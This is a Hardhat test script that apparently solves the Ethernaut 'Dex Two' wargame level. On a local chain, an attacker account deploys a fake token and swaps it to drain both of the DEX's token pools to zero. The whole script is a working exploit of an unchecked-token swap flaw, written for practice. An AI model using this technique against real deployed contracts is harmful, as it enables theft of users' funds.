import { expect } from "chai";
import { BigNumber } from "ethers";
import { parseEther } from "ethers/lib/utils";
import { ethers } from "hardhat";

describe("Dex Two", function () {
  it("Should go to zero", async function () {
    const [owner, attacker] = await ethers.getSigners()

    // deploy dex
    const Dex = await ethers.getContractFactory("DexTwo");
    const dex = await Dex.connect(owner).deploy();
    await dex.deployed();


    // deploy first token
    const FirstToken = await ethers.getContractFactory("SwappableTokenTwo")
    const firstToken = await FirstToken.connect(owner).deploy(dex.address, "First Token", "FT", 110)
    await firstToken.deployed()

    // deploy second token
    const SecondToken = await ethers.getContractFactory("SwappableTokenTwo")
    const secondToken = await SecondToken.connect(owner).deploy(dex.address, "Second Token", "ST", 110)
    await secondToken.deployed()

    // set tokens
    const setTokensTx = await dex.setTokens(firstToken.address, secondToken.address)
    await setTokensTx.wait(1)

    // add liquidity
    const firstTokenLiquidity = await firstToken.connect(owner).transfer(dex.address, 100)
    firstTokenLiquidity.wait(1)
    const secondTokenLiquidity = await secondToken.connect(owner).transfer(dex.address, 100)
    secondTokenLiquidity.wait(1)

    // add initial balance to attacker
    const firstTokenInitialBalance = await firstToken.connect(owner).transfer(attacker.address, 10)
    firstTokenInitialBalance.wait(1)
    const secondTokenInitialBalance = await secondToken.connect(owner).transfer(attacker.address, 10)
    secondTokenInitialBalance.wait(1)

    // check if dex balance is 100 / 100
    expect(
      await dex.balanceOf(firstToken.address, dex.address)
    ).to.equal(BigNumber.from(100))
    expect(
      await dex.balanceOf(secondToken.address, dex.address)
    ).to.equal(BigNumber.from(100))

    // check if attacker balance 10 / 10
    expect(
      await dex.balanceOf(firstToken.address, attacker.address)
    ).to.equal(BigNumber.from(10))
    expect(
      await dex.balanceOf(secondToken.address, attacker.address)
    ).to.equal(BigNumber.from(10))

    // check balance function
    const checkBalance = async (address: string): Promise<BigNumber[]> => {
      const firstTokenBalance = await firstToken.balanceOf(address)
      const secondTokenBalance = await secondToken.balanceOf(address)
      console.log(firstTokenBalance, secondTokenBalance)
      return [firstTokenBalance, secondTokenBalance]
    }

    // deploy attack token
    const AttackToken = await ethers.getContractFactory("SwappableTokenTwo")
    const attackToken = await AttackToken.connect(attacker).deploy(dex.address, "Attack Token", "AT", 400)
    await attackToken.deployed()
    console.log("Attack token deployed")

    // approve big number
    const approveTx = await attackToken.connect(attacker)["approve(address,uint256)"](dex.address, parseEther("1"))
    await approveTx.wait(1)
    console.log("1 eth approved")

    // steal first token
    // transfer 100 attack token to Dex
    const transferATx = await attackToken.connect(attacker).transfer(dex.address, 100)
    await transferATx.wait(1)
    console.log("100 token sent")
    // do swap with attack token -> first token
    const swapATx = await dex.connect(attacker).swap(attackToken.address, firstToken.address, 100)
    await swapATx.wait(1)
    console.log("successfully swap 100 attack token -> first token")

    // steal second token
    // do swap with attack token -> second token
    const swapBTx = await dex.connect(attacker).swap(attackToken.address, secondToken.address, 200)
    await swapBTx.wait(1)
    console.log("successfully swap 100 attack token -> second token")


    const [firstTokenDexBalance, secondTokenDexBalance] = await checkBalance(dex.address)
    expect(firstTokenDexBalance).to.equal(BigNumber.from(0))
    expect(secondTokenDexBalance).to.equal(BigNumber.from(0))

  });
});
